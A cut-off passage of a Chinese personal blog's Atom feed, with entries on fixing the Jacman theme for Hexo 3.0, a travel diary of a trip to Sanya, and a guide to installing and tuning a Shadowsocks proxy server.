class=&quot;meta&quot;&gt;#修改上次提交的用户信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt; format.pretty oneline        &lt;span class=&quot;meta&quot;&gt;#显示历史记录时，每个提交的信息只显示一行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      学习使用 Git 已经一年有余，一些常用技能也用的炉火纯青了，但偶尔碰到一些生僻的技能，总是需要去 Google，第二次用时又忘了。所以这是一篇我自认为比较重要的 Git 技能表，主要供自己查阅使用，反复查阅能够加深印象，提升技能熟练度。
    
    </summary>
    
      <category term="杂项资源" scheme="http://wuchong.me/categories/%E6%9D%82%E9%A1%B9%E8%B5%84%E6%BA%90/"/>
    
    
      <category term="Git" scheme="http://wuchong.me/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Jacman 支持 Hexo 3</title>
    <link href="http://wuchong.me/blog/2015/03/12/support-jacman-to-Hexo-3/"/>
    <id>http://wuchong.me/blog/2015/03/12/support-jacman-to-Hexo-3/</id>
    <published>2015-03-12T11:49:49.000Z</published>
    <updated>2016-03-08T12:18:59.000Z</updated>
    
    <content type="html">&lt;p&gt;Hexo 的发展很迅速，也很快吸引了一大批忠实用户，随着Hexo 3.0 的推出相信会加速这个进程。Hexo 3.0 是个大更新，更强大的性能，更好用的API，模块化了大部分组件等等。但是对于很多主题来说，出现了不兼容的情况，最常见的是 &lt;code&gt;style.css&lt;/code&gt; 生成错误，比如 Pacman 系列主题。&lt;/p&gt;
&lt;p&gt;随着很多用户在 Github 上、邮件上、论坛上问我有关主题不能用的问题，我都回复降级至 2.8.3。 但这毕竟不是一个解决办法，于是挤出点时间，将 Jacman 支持到 Hexo 3.0。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;主要原因出在 &lt;code&gt;source/css/_base/variable.styl&lt;/code&gt;中有两行代码：&lt;br&gt;&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root = hexo-&lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;root&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//highlight&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;highlight = hexo-&lt;span class=&quot;built_in&quot;&gt;config&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;highlight.enable&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;关键是&lt;code&gt;highlight = hexo-config(&amp;quot;highlight.enable&amp;quot;)&lt;/code&gt;，hexo-config 方法会去 theme 主题下的 &lt;code&gt;_config.yml&lt;/code&gt; 中查找参数中的配置项。当 stylus 找不到二级属性时会报错，导致&lt;code&gt;style.css&lt;/code&gt;生成失败（我在windows下会出现这个问题，mac下未重现）。因此两种办法都可以：1. 删除该行 2. 在 theme 主题下的&lt;code&gt;_config.yml&lt;/code&gt;中添加&lt;code&gt;highlight&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;同理，root 属性是在博客根目录配置文件下设置的，在主题配置文件中未配置，所以&lt;code&gt;root = hexo-config(&amp;quot;root&amp;quot;)&lt;/code&gt;获取到的值会是空。这会导致用户头像等url路径的错误。最简单的修改方法是 &lt;code&gt;root = &amp;quot;../&amp;quot;&lt;/code&gt;，其他地方均不用修改。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;至此，Jacman 已支持 Hexo 3.0 。Have a nice day !&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;Update&quot;&gt;&lt;a href=&quot;#Update&quot; class=&quot;headerlink&quot; title=&quot;Update&quot;&gt;&lt;/a&gt;Update&lt;/h2&gt;&lt;p&gt;感谢 &lt;a href=&quot;http://smvirus.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@狸狸园上草&lt;/a&gt; 的反馈，tags 和 categories 在分类或标签数为0时也会显示出来。已修复此 BUG。&lt;/p&gt;
&lt;p&gt;另外 Hexo 3.0 目前默认并未安装 deployer 和 feed 插件。如果你使用 GitHub 或者 GitCafe ，使用如下命令安装部署插件：&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ npm &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; hexo-deployer-git &lt;span class=&quot;comment&quot;&gt;--save&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果你发现 RSS 不可用，说明 feed 插件也没安装，使用如下命令 ：&lt;br&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ npm &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; hexo-generator-feed &lt;span class=&quot;comment&quot;&gt;--save&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;并在 &lt;code&gt;_config.yml&lt;/code&gt; 中配置：&lt;br&gt;&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;feed:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;  type:&lt;/span&gt; atom       &lt;span class=&quot;meta&quot;&gt;#feed 类型 (atom/rss2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;  path:&lt;/span&gt; atom.xml   &lt;span class=&quot;meta&quot;&gt;#rss 路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;  limit:&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;        &lt;span class=&quot;meta&quot;&gt;#在 rss 中最多生成的文章数(0显示所有)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;PS:有任何关于 Hexo 的问题，欢迎来 &lt;a href=&quot;https://coderq.com/c/tech/hexo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo 中文社区&lt;/a&gt; 咨询。&lt;/em&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Hexo 的发展很迅速，也很快吸引了一大批忠实用户，随着Hexo 3.0 的推出相信会加速这个进程。Hexo 3.0 是个大更新，更强大的性能，更好用的API，模块化了大部分组件等等。但是对于很多主题来说，出现了不兼容的情况，最常见的是 &lt;code&gt;style.css&lt;/code&gt; 生成错误，比如 Pacman 系列主题。&lt;/p&gt;
&lt;p&gt;随着很多用户在 Github 上、邮件上、论坛上问我有关主题不能用的问题，我都回复降级至 2.8.3。 但这毕竟不是一个解决办法，于是挤出点时间，将 Jacman 支持到 Hexo 3.0。&lt;/p&gt;
    
    </summary>
    
      <category term="Hexo" scheme="http://wuchong.me/categories/Hexo/"/>
    
    
      <category term="Jacman" scheme="http://wuchong.me/tags/Jacman/"/>
    
  </entry>
  
  <entry>
    <title>北纬18°，三亚的碧海琼天</title>
    <link href="http://wuchong.me/blog/2015/02/17/trip-of-sanya/"/>
    <id>http://wuchong.me/blog/2015/02/17/trip-of-sanya/</id>
    <published>2015-02-17T13:35:13.000Z</published>
    <updated>2016-03-08T12:19:35.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;strong&gt;多图预警，所有图片均由爪机拍摄&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2月5日，这天刚好是公司年会，请了假带着女友坐在飞往三亚的飞机上，一路踩着棉花糖般的云朵抵达了三亚，开始了五天五夜之行。&lt;/p&gt;
&lt;p&gt;这次旅游的行程安排只计划了两三天，结果行程有些局促，幸好还算顺利。五个晚上我们换了四个酒店，三亚之行俨然成了三亚酒店之旅，一路上多半与旅行箱结伴，走过了3湾1岛1公园。一位阿姨见状感叹也只有年轻人敢这样，不过现在回味起来也多了很多不一样的体验。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Day-0&quot;&gt;&lt;a href=&quot;#Day-0&quot; class=&quot;headerlink&quot; title=&quot;Day 0&quot;&gt;&lt;/a&gt;Day 0&lt;/h2&gt;&lt;p&gt;抵达凤凰机场，前往新疆大厦，迎着海风走了走夜色中的三亚湾。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497gw1epc8wug0ksj21kw16o7q0.jpg&quot; alt=&quot;新疆大厦，帆船设计&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Day-1-三亚湾&quot;&gt;&lt;a href=&quot;#Day-1-三亚湾&quot; class=&quot;headerlink&quot; title=&quot;Day 1 三亚湾&quot;&gt;&lt;/a&gt;Day 1 三亚湾&lt;/h2&gt;&lt;p&gt;离开新疆大厦，前往大东海。传说中的海景房：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497gw1epc8wzon9uj21kw16owzn.jpg&quot; alt=&quot;大东海海景房&quot;&gt;&lt;/p&gt;
&lt;p&gt;前往椰梦长廊。椰梦长廊属于三亚湾，有长长的椰林带，比较出名的是这里是三亚最适合观看海上日落的地方。可惜我们等了一下午，中午还是艳阳高照，傍晚却是乌云密布，很遗憾没有看到「半江瑟瑟半江红」的美景。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497gw1epc8x42k1jj21kw23u1il.jpg&quot; alt=&quot;日落前的三亚湾&quot;&gt;&lt;/p&gt;
&lt;p&gt;晚上在第一市场吃了最奢侈的一顿海鲜大餐，辣炒白螺真是赞，还是不习惯一些奇奇怪怪的海洋生物。&lt;/p&gt;
&lt;h2 id=&quot;Day-2-大东海&quot;&gt;&lt;a href=&quot;#Day-2-大东海&quot; class=&quot;headerlink&quot; title=&quot;Day 2 大东海&quot;&gt;&lt;/a&gt;Day 2 大东海&lt;/h2&gt;&lt;p&gt;大东海是最适合住宿的地方，身处市区，交通四通八达，出门右拐就有不亚于亚龙湾远甚于三亚湾的沙滩。吃完午饭来个椰子，游个泳，晒个日光浴，甚是惬意。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497gw1epc8xg6bbmj21kw16oqv5.jpg&quot; alt=&quot;大东海&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Day-3-热带森林天堂公园&quot;&gt;&lt;a href=&quot;#Day-3-热带森林天堂公园&quot; class=&quot;headerlink&quot; title=&quot;Day 3 热带森林天堂公园&quot;&gt;&lt;/a&gt;Day 3 热带森林天堂公园&lt;/h2&gt;&lt;p&gt;森林天堂是我最留恋最喜欢的一个景点，这里也是《非诚勿扰2》的主拍摄地。看厌了海滩，来森林里感受下自然的气息还是很不错的。&lt;/p&gt;
&lt;p&gt;我们订了鸟巢的酒店，管家们非常热心地来山下接我们。坐着游览车沿山路而上，路抖弯急，有点过山车般的刺激。迎面还会遇到下山的游览车，擦肩而过时会嘲我们大声喊「啊~~~」，没有心理准备会被吓一跳。「那是这里游客们独有的打招呼方式」，管家说。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://p.chanyouji.cn/26881/1362232816156p17klmdnu91ii71tvn1g41bmkljoa.jpg-display_ggg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;拿着房卡可以游览森林公园内的所有景点，这也是我们选择住在山顶的原因。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497gw1epc8zha21kj21kw16oqpa.jpg&quot; alt=&quot;清晨山顶的景色&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497gw1epcoj6ullgj20q00yokc6.jpg&quot; alt=&quot;槟榔树&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497gw1epcojawuw9j20yo0yo7kz.jpg&quot; alt=&quot;《非诚勿扰2》拍摄场地&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/mw690/81b78497gw1epc906jk9uj21f01w0u0x.jpg&quot; alt=&quot;葛优舒淇的试婚房，我肯定这沙发他们坐过&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/mw690/81b78497gw1epc90d4a2vj21kw23uhdu.jpg&quot; alt=&quot;过江索道&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497gw1epc8zf52hxj21f01w04qp.jpg&quot; alt=&quot;价值198/位的自助早餐，免费的&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Day-4-亚龙湾&quot;&gt;&lt;a href=&quot;#Day-4-亚龙湾&quot; class=&quot;headerlink&quot; title=&quot;Day 4 亚龙湾&quot;&gt;&lt;/a&gt;Day 4 亚龙湾&lt;/h2&gt;&lt;p&gt;森林天堂离亚龙湾很近，十多分钟的车程就到达了我们的下一个酒店。其前靠花园人工湖，背靠亚龙湾，风景尤美。相对于去海滩溜达（又是海滩），我更喜欢在花园里坐着发呆。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497gw1epc91cc91hj21f01w0u0x.jpg&quot; alt=&quot;发呆&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/mw690/81b78497gw1epc90uzobtj20yo0q0grf.jpg&quot; alt=&quot;特别喜欢这张在亚龙湾沙滩拍的照片&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Day-5-蜈支洲岛&quot;&gt;&lt;a href=&quot;#Day-5-蜈支洲岛&quot; class=&quot;headerlink&quot; title=&quot;Day 5 蜈支洲岛&quot;&gt;&lt;/a&gt;Day 5 蜈支洲岛&lt;/h2&gt;&lt;p&gt;三亚好像有一个不成文的规矩，来三亚必去蜈支洲。就好像没去过蜈支洲就白去了三亚一样，因为传说中最好的海滩就在蜈支洲岛。不过像我这种粗人是看不出区别的，给我印象深刻的是沙滩上各种壳，走路都苦难，还不如亚龙湾的细柔。不过，由于还没有过度开发，海水还是很清澈的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497gw1epc90r265gj21kw23unpd.jpg&quot; alt=&quot;蜈支洲海滩，清澈干净&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/mw690/81b78497gw1epc92bllwfj20q00yowjm.jpg&quot; alt=&quot;妈祖庙附近&quot;&gt;&lt;/p&gt;
&lt;p&gt;最后去了趟「海棠湾免税购物中心」，满足了下这小女生的愿望。刷卡的哔哔声中，为我们的三亚之旅画上了句点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497gw1epc90tz85bj21kw16o4qp.jpg&quot; alt=&quot;海棠湾免税购物中心&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;小贴士&quot;&gt;&lt;a href=&quot;#小贴士&quot; class=&quot;headerlink&quot; title=&quot;小贴士&quot;&gt;&lt;/a&gt;小贴士&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;三亚很多景点有免费班车，千万别信网上的信息，很多都是过期的，最好打客服电话确认。&lt;/li&gt;
&lt;li&gt;不要像我这样一天换一个酒店，太折腾了。老老实实住市区就是了（豪华游除外）。&lt;/li&gt;
&lt;li&gt;有条件的话，可以在蜈支洲岛上的珊瑚酒店住几天，乐得逍遥自在。&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;多图预警，所有图片均由爪机拍摄&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2月5日，这天刚好是公司年会，请了假带着女友坐在飞往三亚的飞机上，一路踩着棉花糖般的云朵抵达了三亚，开始了五天五夜之行。&lt;/p&gt;
&lt;p&gt;这次旅游的行程安排只计划了两三天，结果行程有些局促，幸好还算顺利。五个晚上我们换了四个酒店，三亚之行俨然成了三亚酒店之旅，一路上多半与旅行箱结伴，走过了3湾1岛1公园。一位阿姨见状感叹也只有年轻人敢这样，不过现在回味起来也多了很多不一样的体验。&lt;/p&gt;
    
    </summary>
    
      <category term="随笔生活" scheme="http://wuchong.me/categories/%E9%9A%8F%E7%AC%94%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="游记" scheme="http://wuchong.me/tags/%E6%B8%B8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>科学上网之 Shadowsocks 安装及优化加速</title>
    <link href="http://wuchong.me/blog/2015/02/02/shadowsocks-install-and-optimize/"/>
    <id>http://wuchong.me/blog/2015/02/02/shadowsocks-install-and-optimize/</id>
    <published>2015-02-02T12:58:49.000Z</published>
    <updated>2016-03-08T12:17:46.000Z</updated>
    
    <content type="html">&lt;p&gt;最近国内的网络形式越来越严峻，在日益高筑的围墙之下，掌握一门穿墙之术越来越成为需要。相对于 VPN 而已， Shadowsocks 更为轻量级，安装配置过程极其简单。而客户端也可以在windows、mac、iOS和android上轻松运行，被人们所深深喜爱。感谢 &lt;a href=&quot;https://twitter.com/clowwindy&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@clowwindy&lt;/a&gt;，带给我们一款如此好用的&lt;a href=&quot;https://github.com/shadowsocks/shadowsocks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;开源软件&lt;/a&gt;。下面说说 Shadowosocks 的安装和优化。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;1-服务端安装&quot;&gt;&lt;a href=&quot;#1-服务端安装&quot; class=&quot;headerlink&quot; title=&quot;1. 服务端安装&quot;&gt;&lt;/a&gt;1. 服务端安装&lt;/h2&gt;&lt;p&gt;官方推荐 Ubuntu 14.04 LTS 作为服务器以便使用 TCP Fast Open。服务器端的安装非常简单。&lt;/p&gt;
&lt;p&gt;Debian / Ubuntu:&lt;br&gt;&lt;figure class=&quot;highlight cmake&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt-get &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; python-pip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; shadowsocks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;CentOS:&lt;br&gt;&lt;figure class=&quot;highlight cmake&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; python-setuptools &amp;amp;&amp;amp; easy_install pip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip &lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; shadowsocks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后直接在后台运行：&lt;br&gt;&lt;figure class=&quot;highlight cos&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssserver -p &lt;span class=&quot;number&quot;&gt;8000&lt;/span&gt; -&lt;span class=&quot;keyword&quot;&gt;k&lt;/span&gt; password -m rc4-md5 -&lt;span class=&quot;keyword&quot;&gt;d&lt;/span&gt; start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当然也可以使用配置文件进行配置，方法创建&lt;code&gt;/etc/shadowsocks.json&lt;/code&gt;文件，填入如下内容：&lt;br&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;server&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;my_server_ip&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;server_port&quot;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;8000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;local_address&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;local_port&quot;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;1080&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;mypassword&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;timeout&quot;&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;300&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;rc4-md5&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后使用配置文件在后台运行：&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssserver -c /etc/shadowsocks&lt;span class=&quot;selector-class&quot;&gt;.json&lt;/span&gt; -d start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果要停止运行，将命令中的&lt;code&gt;start&lt;/code&gt;改成&lt;code&gt;stop&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;TIPS: 加密方式推荐使用&lt;code&gt;rc4-md5&lt;/code&gt;，因为 RC4 比 AES 速度快好几倍，如果用在路由器上会带来显著性能提升。旧的 RC4 加密之所以不安全是因为 Shadowsocks 在每个连接上重复使用 key，没有使用 IV。现在已经重新正确实现，可以放心使用。更多可以看 &lt;a href=&quot;https://github.com/clowwindy/shadowsocks/issues/178&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;issue&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&quot;2-客户端安装&quot;&gt;&lt;a href=&quot;#2-客户端安装&quot; class=&quot;headerlink&quot; title=&quot;2. 客户端安装&quot;&gt;&lt;/a&gt;2. 客户端安装&lt;/h2&gt;&lt;p&gt;客户端安装比较入门，这里就不说了，可以参考&lt;a href=&quot;http://www.jianshu.com/p/08ba65d1f91a&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这篇文章&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&quot;3-加速优化&quot;&gt;&lt;a href=&quot;#3-加速优化&quot; class=&quot;headerlink&quot; title=&quot;3. 加速优化&quot;&gt;&lt;/a&gt;3. 加速优化&lt;/h2&gt;&lt;p&gt;下面介绍几种简单的优化方法，也是比较推荐的几种，能够得到立竿见影的效果。当然还有一些黑科技我没提到，如有大神路过，也可留言指出。&lt;/p&gt;
&lt;h3 id=&quot;3-1-内核参数优化&quot;&gt;&lt;a href=&quot;#3-1-内核参数优化&quot; class=&quot;headerlink&quot; title=&quot;3.1  内核参数优化&quot;&gt;&lt;/a&gt;3.1  内核参数优化&lt;/h3&gt;&lt;p&gt;首先，将 Linux 内核升级到 3.5 或以上。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一步，增加系统文件描述符的最大限数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;编辑文件 &lt;code&gt;limits.conf&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight vim&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;vi&lt;/span&gt; /etc/security/limits.&lt;span class=&quot;keyword&quot;&gt;conf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;增加以下两行&lt;br&gt;&lt;figure class=&quot;highlight asciidoc&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;bullet&quot;&gt;* &lt;/span&gt;soft nofile 51200&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;bullet&quot;&gt;* &lt;/span&gt;hard nofile 51200&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;启动shadowsocks服务器之前，设置以下参数&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;ulimit&lt;/span&gt; -n 51200&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二步，调整内核参数&lt;/strong&gt;&lt;br&gt;修改配置文件 &lt;code&gt;/etc/sysctl.conf&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;fs&lt;span class=&quot;selector-class&quot;&gt;.file-max&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;51200&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.core&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.rmem_max&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;67108864&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.core&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.wmem_max&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;67108864&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.core&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.netdev_max_backlog&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;250000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;net&lt;span class=&quot;selector-class&quot;&gt;.core&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.somaxconn&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 